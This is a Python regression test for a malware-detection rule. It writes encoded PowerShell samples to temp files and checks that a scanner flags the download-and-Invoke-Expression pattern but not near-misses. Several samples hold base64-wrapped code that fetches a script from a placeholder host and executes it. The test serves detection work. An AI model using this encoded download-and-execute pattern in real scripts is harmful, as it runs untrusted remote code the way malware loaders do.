"""Static regression cases: no PowerShell or downloaded code is executed."""
import base64
import json
import os
from pathlib import Path
import subprocess
import tempfile

RULE = 'micro-behaviors/process/deploy/script-eval::encoded-downloadstring-script-variable-eval'
ROOT = Path(__file__).resolve().parents[3]
SCRATCH = ROOT / 'testdata'
CASES = {
    'bound': ('$script = $client.DownloadString($url)\nInvoke-Expression $script', True),
    'case-variant': ('$SCRIPT = $other.DOWNLOADSTRING($endpoint)\ninvoke-expression $script', True),
    'different-result': ('$payload = $client.DownloadString($url)\nInvoke-Expression $script', False),
    'different-eval': ('$script = $client.DownloadString($url)\nInvoke-Expression $other', False),
    'reassigned': ('$script = $client.DownloadString($url)\n$script="safe"\nInvoke-Expression $script', False),
    'property-eval': ('$script = $client.DownloadString($url)\nInvoke-Expression $script.Length', False),
    'prefix-result': ('$scriptCache = $client.DownloadString($url)\nInvoke-Expression $script', False),
    'prefix-eval': ('$script = $client.DownloadString($url)\nInvoke-Expression $scriptCache', False),
    'download-only': ('$script = $client.DownloadString($url)\nWrite-Output $script', False),
    'plaintext': ('$script = $client.DownloadString($url)\nInvoke-Expression $script', False),
}


def main():
    cleave = os.environ.get('CLEAVE', 'cleave')
    with tempfile.TemporaryDirectory(prefix='encoded-downloadstring-', dir=SCRATCH) as directory:
        paths = []
        for name, (body, _) in CASES.items():
            source = '$url="https://example.invalid/stage.ps1"\n$client=New-Object System.Net.WebClient\n' + body
            if name != 'plaintext':
                payload = base64.b64encode(source.encode()).decode()
                source = '$wire="' + payload + '"\n$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wire))\nInvoke-Expression $code\n'
            path = Path(directory) / (name + '.ps1')
            path.write_text(source)
            paths.append(str(path))
        platform_cases = {
            'ios-family': ('const models = ["iPad", "iPhone", "iPod"];', True),
            'ipad-only': ('const models = ["iPad"];', False),
            'other-devices': ('const models = ["Android", "Windows"];', False),
            'ua-and-family': ('const models=["iPad","iPhone"]; if (navigator.userAgent.includes("iPad")) res.send("ok");', True),
        }
        for name, (source, _) in platform_cases.items():
            path = Path(directory) / (name + '.js')
            path.write_text(source)
            paths.append(str(path))
            platform_rule = 'micro-behaviors/os/sysinfo/platform/mobile::ios-device-family-token-list'
            debug = subprocess.run([cleave, '--traits-dir', str(ROOT), 'test-rules', str(path), '--rules', platform_rule],
                                   capture_output=True, text=True, check=True)
            # Baseline facts can match without being emitted by a full scan.
            assert ('Summary: 1 matched, 0 not matched' in debug.stdout) == platform_cases[name][1], (name, debug.stdout)
        result = subprocess.run([cleave, '--traits-dir', str(ROOT), '--format', 'json', *paths],
                                capture_output=True, text=True, check=True)
        decoder = json.JSONDecoder()
        data = result.stdout.strip()
        seen = set()
        while data:
            report, end = decoder.raw_decode(data)
            data = data[end:].lstrip()
            for file in report['files']:
                name = Path(file['path']).stem
                if name not in CASES and name not in platform_cases:
                    continue
                hits = {trait['id'] for trait in file.get('traits', [])}
                if name in platform_cases:
                    platform_rule = 'micro-behaviors/os/sysinfo/platform/mobile::ios-device-family-token-list'
                    if name == 'ua-and-family':
                        assert 'objectives/anti-analysis/geofencing/browser::ipad-response-routing' not in hits
                else:
                    assert (RULE in hits) == CASES[name][1], (name, RULE in hits)
                seen.add(name)
        assert seen == set(CASES) | set(platform_cases), seen
        print(f'{len(seen)} transfer, platform-placement and near-miss cases passed')


if __name__ == '__main__':
    main()
